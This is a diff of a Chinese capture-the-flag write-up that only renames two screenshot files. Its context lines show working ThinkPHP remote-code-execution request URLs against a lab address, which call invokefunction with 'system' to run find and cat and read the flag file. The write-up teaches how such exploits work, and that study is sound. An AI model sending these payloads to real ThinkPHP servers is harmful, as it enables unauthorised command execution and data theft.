@@ -13,11 +13,11 @@ http://220.249.52.133:42857/?s=index/\think\App/invokefunction&function=call_use
 
 似乎没有想要的东西，再构造一个，看看有没有和 flag 相关的文件：  
 http://220.249.52.133:42857/?s=index/\think\App/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name "*flag"  
-![avatar](./picture/php_rcw_3.png)  
+![avatar](./picture/php_rce_3.png)  
 
 不错，直接查看这个文件：  
 http://220.249.52.133:42857/?s=index/\think\App/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag  
-![avatar](./picture/php_rcw_4.png)  
+![avatar](./picture/php_rce_4.png)  
 得到 flag。  
 
 ## 相关链接
